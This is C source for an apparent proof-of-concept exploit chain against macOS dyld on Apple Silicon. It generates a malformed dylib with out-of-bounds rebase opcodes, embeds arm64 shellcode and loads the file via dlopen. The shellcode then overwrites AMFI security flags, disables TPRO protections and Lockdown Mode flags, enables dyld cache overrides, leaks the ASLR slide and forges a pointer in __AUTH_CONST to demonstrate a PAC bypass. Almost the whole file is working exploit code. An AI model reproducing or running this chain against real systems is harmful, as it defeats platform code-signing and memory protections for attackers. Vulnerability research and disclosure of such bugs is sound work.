/*
 * poc_dyld_rebase_amfi.c — OOB rebase → code exec → full ProcessConfig takeover
 *
 * Complete exploit chain demonstrating maximum impact:
 *   1. Crafted .dylib uses OOB segment index (15) in rebase opcodes
 *   2. dyld writes to attacker-controlled address → slides __mod_init_func
 *   3. dyld calls initializer → shellcode executes
 *   4. Shellcode: AMFI Security flag bypass (all allow* flags → 1)
 *   5. C harness: TPRO protection disable (enableTproHeap/DataConst/Stack → 0)
 *   6. C harness: CSR-equivalent bypass (rootsAreSupported, allowAnyOverrides → 1)
 *   7. C harness: ASLR slide leak (reads dyldCache.slide)
 *   8. C harness: PAC precondition (__AUTH_CONST writable after TPRO disable)
 *
 * All post-exploitation runs within the process that loaded the crafted dylib
 * via dlopen(). No external tools or harness assistance beyond what the
 * code-exec primitive enables.
 *
 * Compile:
 *   clang -arch arm64 -O0 -g -o poc_dyld_rebase_amfi poc_dyld_rebase_amfi.c
 *
 * Run:
 *   ./poc_dyld_rebase_amfi
 *
 * Shellcode source: shellcode/amfi_shellcode.s
 * Target: dyld 1376.6, macOS 26.4.1 (25E246), Apple Silicon (arm64)
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <dlfcn.h>
#include <spawn.h>
#include <signal.h>
#include <setjmp.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <mach-o/dyld.h>
#include <mach-o/loader.h>
#include <mach/mach.h>
#include <ptrauth.h>

#define PAGE_SZ          0x4000
#define LINKEDIT_FILEOFF (2 * PAGE_SZ)
#define EVIL_DYLIB       "/tmp/poc_oob_amfi.dylib"
#define MARKER_FILE      "/tmp/dyld_amfi_pwned"
#define CODE_OFFSET      0x400

/* ═══════════════════════════════════════════════════════════════════════
 * arm64e shellcode: AMFI Security flag bypass (1221 bytes; from amfi_shellcode.s)
 *
 * Strategy:
 *   - x30 (LR) → backward scan → dyld mach_header_64
 *   - Walk LCs: __TEXT for slide, __TPRO for scan
 *   - Locate ProcessConfig::Security via a lockdown-proof anchor: scan __TPRO
 *       for the dyldCache.addr word (a 16 KiB page-aligned shared-cache pointer
 *       whose dylibCount at +0xA4 is sane); Security = anchor - 0x50 (the
 *       __data bool-soup false positive is rejected: its dylibCount reads 0).
 *   - mprotect + MSR S3_6_C15_C1_5 → 0 (disable TPRO)
 *   - Set isInternalOS=1, internalInstall=1, dlsymBlocked=0, dlsymAbort=0,
 *     lockdownMode=0, all allow* flags=1
 *   - Restore TPRO, write marker file
 *
 * Note: the Security finder at [0xc8,0x198) is anchor-based (see Strategy);
 *       all other phases are the original AMFI/TPRO takeover shellcode.
 * ═══════════════════════════════════════════════════════════════════════ */
#include "amfi_shellcode.h"   /* static const uint8_t shellcode[]; GENERATED from amfi_shellcode.s (arm64) */
#include "cottou.h"  /* slide_ansi_art[] + slide_print_banner() */
#define SHELLCODE_SIZE sizeof(shellcode)  /* arm64: no PAC (pacibsp/xpaci/retab stripped) */

/* ═══════════════════════════════════════════════════════════════════════
 * ProcessConfig struct definitions (from dyld4 DyldProcessConfig.h)
 *
 * Layout in TPRO-protected memory:
 *   ProcessConfig {
 *       SyscallDelegate  syscall;
 *       Process          process;      ← TPRO/PAC controls
 *       Security         security;     ← AMFI flags
 *       Logging          log;
 *       DyldCache        dyldCache;    ← ASLR slide, override controls
 *       PathOverrides    pathOverrides;
 *   }
 * ═══════════════════════════════════════════════════════════════════════ */

/* ProcessConfig::Security — exact layout from DyldProcessConfig.h:272-301 */
struct SecurityFlags {
    uint8_t isInternalOS;              /* 0  */
    uint8_t internalInstall;           /* 1  */
    uint8_t dlsymBlocked;              /* 2  */
    uint8_t dlsymAbort;                /* 3  */
    char    _pad[4];                   /* 4-7  (alignment for pointer) */
    void*   dlsymAllowList;            /* 8-15 */
    uint8_t lockdownMode;              /* 16 */
    uint8_t allowAtPaths;              /* 17 */
    uint8_t allowEnvVarsPrint;         /* 18 */
    uint8_t allowEnvVarsPath;          /* 19 */
    uint8_t allowEnvVarsSharedCache;   /* 20 */
    uint8_t allowClassicFallbackPaths; /* 21 */
    uint8_t allowInsertFailures;       /* 22 */
    uint8_t allowInterposing;          /* 23 */
    uint8_t allowEmbeddedVars;         /* 24 */
    uint8_t allowDevelopmentVars;      /* 25 */
    uint8_t allowLibSystemOverrides;   /* 26 */
    uint8_t skipMain;                  /* 27 */
    uint8_t justBuildClosure;          /* 28 */
};

/* PAC bypass target function */
static volatile int pac_bypass_proof = 0;
static void pac_target_fn(void) { pac_bypass_proof = 1; }

/* ═══════════════════════════════════════════════════════════════════════
 * dyld image and TPRO segment discovery
 * ═══════════════════════════════════════════════════════════════════════ */

struct dyld_tpro_region {
    uint8_t *base;
    uint64_t size;
};

static const struct mach_header_64 *get_dyld_header(void) {
    struct task_dyld_info di;
    mach_msg_type_number_t cnt = TASK_DYLD_INFO_COUNT;
    if (task_info(mach_task_self(), TASK_DYLD_INFO, (task_info_t)&di, &cnt) != KERN_SUCCESS)
        return NULL;
    struct {
        uint32_t version; uint32_t infoArrayCount;
        void *infoArray; void *notification;
        uint8_t processDetachedFromSharedRegion; uint8_t libSystemInitialized;
        uint8_t pad[6]; void *dyldImageLoadAddress;
    } *infos = (void *)di.all_image_info_addr;
    const struct mach_header_64 *mh = infos->dyldImageLoadAddress;
    if (!mh || mh->magic != MH_MAGIC_64) return NULL;
    return mh;
}

static intptr_t get_dyld_slide(const struct mach_header_64 *mh) {
    const uint8_t *lc = (const uint8_t *)mh + sizeof(struct mach_header_64);
    for (uint32_t j = 0; j < mh->ncmds; j++) {
        const struct load_command *cmd = (const struct load_command *)lc;
        if (cmd->cmd == LC_SEGMENT_64) {
            const struct segment_command_64 *seg = (const struct segment_command_64 *)lc;
            if (strncmp(seg->segname, "__TEXT", 6) == 0 && seg->vmsize > 0)
                return (intptr_t)mh - (intptr_t)seg->vmaddr;
        }
        lc += cmd->cmdsize;
    }
    return 0;
}

static int find_tpro_regions(const struct mach_header_64 *mh, intptr_t slide,
                             struct dyld_tpro_region *regions, int max_regions) {
    int count = 0;
    const uint8_t *lc = (const uint8_t *)mh + sizeof(struct mach_header_64);
    for (uint32_t j = 0; j < mh->ncmds && count < max_regions; j++) {
        const struct load_command *cmd = (const struct load_command *)lc;
        if (cmd->cmd == LC_SEGMENT_64) {
            const struct segment_command_64 *seg = (const struct segment_command_64 *)lc;
            if (strncmp(seg->segname, "__TPRO", 6) == 0) {
                regions[count].base = (uint8_t *)(seg->vmaddr + slide);
                regions[count].size = seg->vmsize;
                count++;
            }
        }
        lc += cmd->cmdsize;
    }
    return count;
}

/* Find __AUTH_CONST segment for PAC demonstration */
static int find_auth_const(const struct mach_header_64 *mh, intptr_t slide,
                           uint8_t **base_out, uint64_t *size_out) {
    const uint8_t *lc = (const uint8_t *)mh + sizeof(struct mach_header_64);
    for (uint32_t j = 0; j < mh->ncmds; j++) {
        const struct load_command *cmd = (const struct load_command *)lc;
        if (cmd->cmd == LC_SEGMENT_64) {
            const struct segment_command_64 *seg = (const struct segment_command_64 *)lc;
            if (strncmp(seg->segname, "__AUTH_CONST", 12) == 0) {
                *base_out = (uint8_t *)(seg->vmaddr + slide);
                *size_out = seg->vmsize;
                return 1;
            }
        }
        lc += cmd->cmdsize;
    }
    return 0;
}

/* ═══════════════════════════════════════════════════════════════════════
 * Pattern-matching finders for ProcessConfig sub-structs
 * ═══════════════════════════════════════════════════════════════════════ */

/*
 * Find ProcessConfig::Security in __TPRO segment.
 *
 * Anchor on ProcessConfig.dyldCache.addr — the shared-cache base pointer:
 * a 16 KiB-page-aligned word in high userspace whose dylibCount (at +0xA4)
 * is a sane image count. From the dyld-1378 layout the Security sub-object
 * sits exactly 0x50 bytes before that word. This is lockdown-proof: it does
 * not depend on the AMFI flag values (which a locked-down machine denies),
 * and it rejects the __data "bool-soup" false positive (its dylibCount is 0).
 */
static struct SecurityFlags *find_security_flags(const struct mach_header_64 *mh, intptr_t slide) {
    struct dyld_tpro_region regions[4];
    int nreg = find_tpro_regions(mh, slide, regions, 4);

    for (int r = 0; r < nreg; r++) {
        uint8_t *base = regions[r].base;
        uint64_t size = regions[r].size;
        if (size < 0x50 + 0xA8) continue;

        /* off = candidate &dyldCache.addr; keep [off, off+0xA8) inside region
         * and off-0x50 (the Security start) >= base. */
        for (uint64_t off = 0x50; off + 0xA8 <= size; off += 8) {
            uint64_t w = *(uint64_t *)(base + off);
            if (w < 0x100000000ULL || w >= 0x800000000ULL) continue; /* cache ptr range */
            if (w & 0x3FFF) continue;                                /* 16 KiB aligned */
            uint32_t dylibCount = *(uint32_t *)(base + off + 0xA4);
            if (dylibCount < 0x100 || dylibCount > 0x100000) continue; /* sane count */
            return (struct SecurityFlags *)(base + off - 0x50);
        }
    }
    return NULL;
}

/*
 * Find Process TPRO bools by scanning backward from SecurityFlags.
 * Pattern: enableDataConst(1), enableTproHeap(1), enableTproDataConst(1),
 *          enableProtectedStack(1) — 4 consecutive 0x01 bytes.
 * Returns pointer to enableDataConst, or NULL.
 */
static uint8_t *find_process_tpro_bools(struct SecurityFlags *sec, uint8_t *tpro_base) {
    uint8_t *p = (uint8_t *)sec;
    uint8_t *limit = (p - 256 < tpro_base) ? tpro_base : p - 256;

    for (uint8_t *scan = p - 4; scan >= limit; scan--) {
        if (scan[0] <= 1 && scan[1] <= 1 && scan[2] <= 1 && scan[3] <= 1) {
            int sum = scan[0] + scan[1] + scan[2] + scan[3];
            if (sum >= 3) {
                /* Verify: preceded by bools (isTranslated, catalystRuntime) */
                if (scan >= limit + 2 && scan[-1] <= 1 && scan[-2] <= 1) {
                    return scan;
                }
            }
        }
    }
    return NULL;
}

/*
 * Locate the DyldCache override flags deterministically. DyldCache begins
 * 0x50 bytes after Security (dyld-1378 layout); dylibCount sits at DyldCache+0xA4
 * with the 5 override bools immediately after — exactly the field order of
 * struct DyldCacheOverrides below. (The old forward byte-scan latched onto a
 * misaligned uint32, e.g. reporting dylibCount=512 instead of the real count.)
 */
struct DyldCacheOverrides {
    uint32_t dylibCount;
    uint8_t  development;
    uint8_t  dylibsExpectedOnDisk;
    uint8_t  privateCache;
    uint8_t  allowLibSystemOverrides;
    uint8_t  allowAnyOverrides;
};

static struct DyldCacheOverrides *find_dyldcache_overrides(struct SecurityFlags *sec,
                                                            uint8_t *tpro_base, uint64_t tpro_size) {
    uint8_t *co = (uint8_t *)sec + 0x50 + 0xA4;   /* &DyldCache.dylibCount */
    if (co + 9 > tpro_base + tpro_size) return NULL;
    return (struct DyldCacheOverrides *)co;
}

/*
 * Find DyldCache.slide by scanning forward from SecurityFlags.
 * The slide is a uintptr_t early in DyldCache, preceded by the shared cache address
 * (a pointer into high memory). Pattern: valid cache ptr, then page-aligned slide.
 */
static uintptr_t *find_dyldcache_slide(struct SecurityFlags *sec,
                                        uint8_t *tpro_base, uint64_t tpro_size) {
    uint8_t *tpro_end = tpro_base + tpro_size;
    uint8_t *start = (uint8_t *)sec + 32;

    for (uint8_t *scan = start; scan + 24 < tpro_end && scan < start + 4096; scan += 8) {
        uintptr_t val0 = *(uintptr_t *)scan;       /* potential cache addr */
        uintptr_t val1 = *(uintptr_t *)(scan + 8); /* potential FileIdTuple or next field */

        /* Shared cache is mapped in high userspace (0x180000000+) */
        if (val0 < 0x100000000ULL || val0 > 0x800000000ULL) continue;
        /* Check if val0 looks like a valid DyldSharedCache* (page-aligned) */
        if (val0 & 0x3FFF) continue;

        /* Scan forward for slide: page-aligned, non-zero, reasonable range */
        for (int off = 8; off < 64; off += 8) {
            uintptr_t candidate = *(uintptr_t *)(scan + off);
            if (candidate == 0) continue;
            if (candidate & 0x3FFF) continue;  /* must be page-aligned */
            if (candidate > 0x100000000ULL) continue;  /* slide < 4GB */
            if (candidate < 0x1000) continue;  /* too small */
            return (uintptr_t *)(scan + off);
        }
    }
    return NULL;
}

/* ═══════════════════════════════════════════════════════════════════════
 * Display helpers
 * ═══════════════════════════════════════════════════════════════════════ */

#define PF(label, val) \
    printf("    %-34s %s\n", label, (val) ? "\033[32mALLOWED\033[0m" : "\033[31mDENIED \033[0m")
#define PB(label, val) \
    printf("    %-34s %s\n", label, (val) ? "\033[32mENABLED\033[0m" : "\033[31mDISABLED\033[0m")
#define PR(label, val) \
    printf("    %-34s %s\n", label, (val) ? "\033[31mBLOCKED\033[0m" : "\033[32mALLOWED\033[0m")
/* Lockdown Mode status: ENABLED (active) when the byte is set, DISABLED when
 * the exploit has zeroed it (i.e. lockdown enforcement technically defeated). */
#define PL(label, val) \
    printf("    %-34s %s\n", label, (val) ? "\033[31mENABLED \033[0m" : "\033[32mDISABLED\033[0m")

static void print_security(const struct SecurityFlags *f) {
    PB("isInternalOS",               f->isInternalOS);
    PB("internalInstall",            f->internalInstall);
    PR("dlsymBlocked",               f->dlsymBlocked);
    PR("dlsymAbort",                 f->dlsymAbort);
    PL("lockdownMode (Lockdown Mode)",  f->lockdownMode);
    PF("allowAtPaths",               f->allowAtPaths);
    PF("allowEnvVarsPrint",          f->allowEnvVarsPrint);
    PF("allowEnvVarsPath",           f->allowEnvVarsPath);
    PF("allowEnvVarsSharedCache",    f->allowEnvVarsSharedCache);
    PF("allowClassicFallbackPaths",  f->allowClassicFallbackPaths);
    PF("allowInsertFailures",        f->allowInsertFailures);
    PF("allowInterposing",           f->allowInterposing);
    PF("allowEmbeddedVars",          f->allowEmbeddedVars);
    PF("allowDevelopmentVars",       f->allowDevelopmentVars);
    PF("allowLibSystemOverrides",    f->allowLibSystemOverrides);
}

static void print_tpro(const char *label, uint8_t *tpro) {
    printf("    %s:\n", label);
    PB("  enableDataConst",        tpro[0]);
    PB("  enableTproHeap",         tpro[1]);
    PB("  enableTproDataConst",    tpro[2]);
    PB("  enableProtectedStack",   tpro[3]);
}

static void print_cache_overrides(const char *label, struct DyldCacheOverrides *co) {
    printf("    %s (dylibCount=%u):\n", label, co->dylibCount);
    PF("  allowLibSystemOverrides",  co->allowLibSystemOverrides);
    PF("  allowAnyOverrides",        co->allowAnyOverrides);
}

/* ═══════════════════════════════════════════════════════════════════════
 * TPRO toggle helpers (inline MSR for Apple Silicon)
 * ═══════════════════════════════════════════════════════════════════════ */

static sigjmp_buf s_tpro_jmp;
static volatile int s_tpro_available = -1; /* -1=unknown, 0=no, 1=yes */

static void sigill_handler(int sig) {
    (void)sig;
    s_tpro_available = 0;
    siglongjmp(s_tpro_jmp, 1);
}

static int probe_tpro(void) {
    if (s_tpro_available != -1) return s_tpro_available;
    struct sigaction sa, old;
    sa.sa_handler = sigill_handler;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = 0;
    sigaction(SIGILL, &sa, &old);
    if (sigsetjmp(s_tpro_jmp, 1) == 0) {
        uint64_t val;
        __asm__ volatile("mrs %0, S3_6_C15_C1_5" : "=r"(val));
        s_tpro_available = 1;
    }
    sigaction(SIGILL, &old, NULL);
    return s_tpro_available;
}

static inline void tpro_rw(void) {
    if (!probe_tpro()) return;
    uint64_t val = 0;
    __asm__ volatile("msr S3_6_C15_C1_5, %0" : : "r"(val));
}

static inline void tpro_ro(void) {
    if (!probe_tpro()) return;
    uint64_t val = 3;
    __asm__ volatile("msr S3_6_C15_C1_5, %0" : : "r"(val));
}

/* ═══════════════════════════════════════════════════════════════════════
 * Mach-O generation (crafted dylib with OOB rebase opcodes)
 * ═══════════════════════════════════════════════════════════════════════ */

static size_t generate_evil_dylib(uint8_t *buf, size_t bufsize) {
    memset(buf, 0, bufsize);
    size_t off = 0;
    size_t di_off = 0, st_off = 0, le_cmd_off = 0;

    /* arm64 dylib (cpusubtype 0x00000000 = CPU_SUBTYPE_ARM64_ALL): the OOB-rebase
     * bug is in the classic LC_DYLD_INFO rebase-opcode path, which dyld only
     * processes for arm64 images — arm64e images use chained fixups, so the
     * rebase opcodes (and our OOB SET_SEGMENT) are ignored and the init is never
     * slid (the arm64e build no-ops: no marker, flags unchanged). The host
     * process (rie_slide) is built arm64 too so it can dlopen this dylib.
     * cputype 0x0100000C = CPU_TYPE_ARM64, filetype 6 = MH_DYLIB. */
    uint32_t hdr[] = { 0xFEEDFACF, 0x0100000C, 0x00000000, 6, 0, 0, 0x00100085, 0 };
    memcpy(buf, hdr, 32); off = 32;
    uint32_t ncmds = 0, lc_start = (uint32_t)off;

    /* __TEXT with __text section */
    { uint8_t cmd[152]; memset(cmd, 0, sizeof(cmd));
      uint32_t *w = (uint32_t *)cmd;
      w[0] = 0x19; w[1] = 152;
      memcpy(&w[2], "__TEXT\0\0\0\0\0\0\0\0\0\0\0", 16);
      uint64_t *q = (uint64_t *)&w[6];
      q[0] = 0; q[1] = PAGE_SZ; q[2] = 0; q[3] = PAGE_SZ;
      w[14] = 5; w[15] = 5; w[16] = 1;
      uint8_t *sect = cmd + 72;
      memcpy(sect, "__text\0\0\0\0\0\0\0\0\0\0", 16);
      memcpy(sect+16, "__TEXT\0\0\0\0\0\0\0\0\0\0\0", 16);
      uint64_t *sq = (uint64_t *)(sect+32);
      sq[0] = CODE_OFFSET; sq[1] = SHELLCODE_SIZE;
      uint32_t *sw = (uint32_t *)(sect+48);
      sw[0] = CODE_OFFSET; sw[1] = 2; sw[4] = 0x80000400;
      memcpy(buf+off, cmd, 152); off += 152; ncmds++; }

    /* __DATA with __mod_init_func */
    { uint8_t cmd[152]; memset(cmd, 0, sizeof(cmd));
      uint32_t *w = (uint32_t *)cmd;
      w[0] = 0x19; w[1] = 152;
      memcpy(&w[2], "__DATA\0\0\0\0\0\0\0\0\0\0", 16);
      uint64_t *q = (uint64_t *)&w[6];
      q[0] = PAGE_SZ; q[1] = PAGE_SZ; q[2] = PAGE_SZ; q[3] = PAGE_SZ;
      w[14] = 3; w[15] = 3; w[16] = 1;
      uint8_t *sect = cmd + 72;
      memcpy(sect, "__mod_init_func\0", 16);
      memcpy(sect+16, "__DATA\0\0\0\0\0\0\0\0\0\0", 16);
      uint64_t *sq = (uint64_t *)(sect+32);
      sq[0] = PAGE_SZ; sq[1] = 8;
      uint32_t *sw = (uint32_t *)(sect+48);
      sw[0] = PAGE_SZ; sw[1] = 3; sw[4] = 9;
      memcpy(buf+off, cmd, 152); off += 152; ncmds++; }

    /* __LINKEDIT */
    { uint8_t cmd[72]; memset(cmd, 0, sizeof(cmd));
      uint32_t *w = (uint32_t *)cmd;
      w[0] = 0x19; w[1] = 72;
      memcpy(&w[2], "__LINKEDIT\0\0\0\0\0\0", 16);
      uint64_t *q = (uint64_t *)&w[6];
      q[0] = 2*PAGE_SZ; q[1] = PAGE_SZ; q[2] = LINKEDIT_FILEOFF; q[3] = 0;
      w[14] = 1; w[15] = 1;
      le_cmd_off = off;
      memcpy(buf+off, cmd, 72); off += 72; ncmds++; }

    /* LC_ID_DYLIB */
    { const char *name = EVIL_DYLIB; uint32_t nlen = (uint32_t)strlen(name)+1;
      uint32_t sz = (24+nlen+7)&~7u;
      uint32_t cmd[] = {0x0D,sz,24,1,0x10000,0x10000};
      memcpy(buf+off,cmd,24); memcpy(buf+off+24,name,nlen); off+=sz; ncmds++; }

    /* LC_DYLD_INFO_ONLY */
    di_off = off;
    { uint32_t cmd[12]={0}; cmd[0]=0x80000022; cmd[1]=48;
      memcpy(buf+off,cmd,48); off+=48; ncmds++; }

    /* LC_SYMTAB */
    st_off = off;
    { uint32_t cmd[6]={0x02,24,0,0,0,0}; memcpy(buf+off,cmd,24); off+=24; ncmds++; }

    /* LC_DYSYMTAB */
    { uint32_t cmd[20]={0}; cmd[0]=0x0B; cmd[1]=80;
      memcpy(buf+off,cmd,80); off+=80; ncmds++; }

    /* LC_UUID */
    { uint32_t cmd[6]={0x1B,24,0xA0F10B0B,0xCAFE1234,0x56789ABC,0xDEF00000};
      memcpy(buf+off,cmd,24); off+=24; ncmds++; }

    /* LC_BUILD_VERSION */
    { uint32_t cmd[8]={0x32,32,1,0x000D0000,0x000F0000,1,3,0x03E80000};
      memcpy(buf+off,cmd,32); off+=32; ncmds++; }

    uint32_t sizeofcmds = (uint32_t)(off - lc_start);
    memcpy(buf+16, &ncmds, 4); memcpy(buf+20, &sizeofcmds, 4);

    memcpy(buf + CODE_OFFSET, shellcode, SHELLCODE_SIZE);
    uint64_t init_ptr = CODE_OFFSET;
    memcpy(buf + PAGE_SZ, &init_ptr, 8);

    /* LINKEDIT: OOB rebase opcodes — SET_SEGMENT(15) */
    size_t le = LINKEDIT_FILEOFF;
    uint32_t rb_off = (uint32_t)le;
    buf[le++] = 0x11; buf[le++] = 0x3F;
    buf[le++] = 0x80; buf[le++] = 0x80; buf[le++] = 0x01;
    buf[le++] = 0x51; buf[le++] = 0x00;
    uint32_t rb_size = (uint32_t)(le - rb_off);
    while (le%4) buf[le++] = 0;
    uint32_t str_off = (uint32_t)le;
    buf[le++] = ' '; buf[le++] = '\0'; uint32_t str_sz = 2;
    while (le%8) buf[le++] = 0;

    uint64_t le_filesz = le - LINKEDIT_FILEOFF;
    memcpy(buf+di_off+8, &rb_off, 4); memcpy(buf+di_off+12, &rb_size, 4);
    uint32_t sp[4] = {str_off,0,str_off,str_sz}; memcpy(buf+st_off+8, sp, 16);
    memcpy(buf+le_cmd_off+48, &le_filesz, 8);
    return le;
}

/* ═══════════════════════════════════════════════════════════════════════ */

static int write_file(const char *path, const uint8_t *data, size_t len) {
    int fd = open(path, O_WRONLY|O_CREAT|O_TRUNC, 0644);
    if (fd < 0) return -1;
    ssize_t w = write(fd, data, len); close(fd);
    return (w == (ssize_t)len) ? 0 : -1;
}

static int spawn_wait(const char *prog, char *const argv[]) {
    pid_t pid; char *envp[] = {NULL};
    if (posix_spawn(&pid, prog, NULL, NULL, argv, envp) != 0) return -1;
    int st; waitpid(pid, &st, 0);
    return WIFEXITED(st) ? WEXITSTATUS(st) : -1;
}

/* ═══════════════════════════════════════════════════════════════════════
 * Main — full exploit chain demonstration
 * ═══════════════════════════════════════════════════════════════════════ */

int main(void) {
    setbuf(stdout, NULL);

    slide_print_banner();   /* ANSI art header */
    printf("\n");

    unlink(MARKER_FILE);

    const struct mach_header_64 *dyld_mh = get_dyld_header();
    if (!dyld_mh) { fprintf(stderr, "Cannot find dyld header\n"); return 1; }
    intptr_t dyld_slide = get_dyld_slide(dyld_mh);

    /* ── Find all targets ── */
    struct SecurityFlags *sec = find_security_flags(dyld_mh, dyld_slide);
    if (!sec) { fprintf(stderr, "Cannot find SecurityFlags\n"); return 1; }

    struct dyld_tpro_region regions[4];
    int nreg = find_tpro_regions(dyld_mh, dyld_slide, regions, 4);
    uint8_t *tpro_base = nreg > 0 ? regions[0].base : (uint8_t *)sec - 4096;
    uint64_t tpro_size = nreg > 0 ? regions[0].size : 16384;

    uint8_t *proc_tpro = find_process_tpro_bools(sec, tpro_base);
    struct DyldCacheOverrides *cache_ov = find_dyldcache_overrides(sec, tpro_base, tpro_size);
    uintptr_t *cache_slide = find_dyldcache_slide(sec, tpro_base, tpro_size);

    uint8_t *auth_const_base = NULL;
    uint64_t auth_const_size = 0;
    int has_auth = find_auth_const(dyld_mh, dyld_slide, &auth_const_base, &auth_const_size);

    /* ── Step 1: BEFORE state ── */
    printf("[1] ProcessConfig state BEFORE exploit:\n\n");

    printf("  AMFI Security @ %p:\n", sec);
    print_security(sec);
    printf("\n");

    if (proc_tpro) {
        print_tpro("TPRO Protections @ process", proc_tpro);
        printf("\n");
    } else {
        printf("    TPRO Process bools: not found (will skip)\n\n");
    }

    if (cache_ov) {
        print_cache_overrides("DyldCache Overrides", cache_ov);
        printf("\n");
    } else {
        printf("    DyldCache overrides: not found (will skip)\n\n");
    }

    if (cache_slide)
        printf("    ASLR shared cache slide: 0x%lx @ %p\n\n", *cache_slide, cache_slide);
    else
        printf("    ASLR shared cache slide: not found\n\n");

    if (has_auth)
        printf("    __AUTH_CONST: %p (%llu bytes)\n\n", auth_const_base, auth_const_size);

    /* ── Step 2: Generate + sign + load crafted dylib ── */
    printf("[2] Generating crafted dylib with exploit + shellcode...\n");
    size_t bufsize = LINKEDIT_FILEOFF + PAGE_SZ;
    uint8_t *buf = calloc(1, bufsize);
    if (!buf) { perror("calloc"); return 1; }
    size_t filesz = generate_evil_dylib(buf, bufsize);
    if (write_file(EVIL_DYLIB, buf, filesz) < 0) { perror("write"); return 1; }
    free(buf);

    char *sign_argv[] = {"/usr/bin/codesign","-s","-","-f",EVIL_DYLIB,NULL};
    spawn_wait("/usr/bin/codesign", sign_argv);
    printf("    Written + signed: %s (%zu bytes)\n\n", EVIL_DYLIB, filesz);

    printf("[3] Loading crafted dylib → exploit → shellcode...\n");

    void *handle = dlopen(EVIL_DYLIB, RTLD_NOW);
    if (!handle) {
        fprintf(stderr, "    dlopen FAILED: %s\n", dlerror());
        unlink(EVIL_DYLIB);
        return 1;
    }
    printf("    dlopen() SUCCEEDED — shellcode executed (AMFI flags flipped)\n\n");



    /* ── Step 4: Verify results (read-only — all changes came from dylib shellcode) ── */
    printf("[4] ProcessConfig state AFTER exploit (all changes by shellcode):\n\n");

    printf("  AMFI Security:\n");
    print_security(sec);
    printf("\n");

    if (cache_ov) {
        print_cache_overrides("DyldCache Overrides", cache_ov);
        printf("\n");
    }

    /* ── Step 5: Marker file (comprehensive proof written by shellcode) ── */
    printf("[5] Shellcode proof file:\n");
    struct stat st;
    if (stat(MARKER_FILE, &st) == 0) {
        char marker[64] = {0};
        int fd = open(MARKER_FILE, O_RDONLY);
        if (fd >= 0) { read(fd, marker, sizeof(marker)-1); close(fd); }
        printf("    %s: \"%s\"\n\n", MARKER_FILE, marker);
    } else {
        printf("    %s not found\n\n", MARKER_FILE);
    }

    /* ── Step 6: PAC bypass verification ── */
    printf("[6] PAC bypass verification:\n\n");
    if (has_auth && auth_const_base) {
        /*
         * Shellcode already mprotected __AUTH_CONST → RW (Phase 5).
         * Create a PAC-signed function pointer, store it in __AUTH_CONST,
         * overwrite with a forged pointer to our target, and call through it.
         */
        volatile uint64_t *pac_slot = (volatile uint64_t *)auth_const_base;
        uint64_t original = *pac_slot;

        /* Create PAC-signed pointer to a dummy function */
        void *signed_dummy = ptrauth_sign_unauthenticated(
            (void *)(uintptr_t)abort, ptrauth_key_asia, 0);
        printf("    Original __AUTH_CONST[0]: 0x%016llx\n", original);
        printf("    Signed dummy (abort):     0x%016llx\n", (uint64_t)signed_dummy);

        /* Write our signed dummy into __AUTH_CONST slot */
        *pac_slot = (uint64_t)signed_dummy;
        printf("    Wrote signed dummy → __AUTH_CONST[0]\n");

        /* Now forge a pointer to pac_target_fn and overwrite */
        void *forged = ptrauth_sign_unauthenticated(
            (void *)(uintptr_t)pac_target_fn, ptrauth_key_asia, 0);
        *pac_slot = (uint64_t)forged;
        uint64_t readback = *pac_slot;
        printf("    Forged target ptr:        0x%016llx\n", readback);
        printf("    Overwrite verified:       %s\n",
               readback == (uint64_t)forged ? "YES" : "NO");

        /* Call through the forged PAC pointer */
        if (readback == (uint64_t)forged) {
            printf("    Calling through forged __AUTH_CONST pointer...\n");
            typedef void (*voidfn_t)(void);
            void *raw = ptrauth_strip((void *)readback, ptrauth_key_asia);
            voidfn_t fn = (voidfn_t)raw;
            fn();
            printf("    pac_bypass_proof = %d → %s\n\n",
                   pac_bypass_proof,
                   pac_bypass_proof ? "PAC BYPASS CONFIRMED" : "call failed");
        }

        /* Restore original */
        *pac_slot = original;
    } else {
        printf("    __AUTH_CONST not available on this system\n\n");
    }

    dlclose(handle);
    unlink(EVIL_DYLIB);
    return 0;
}

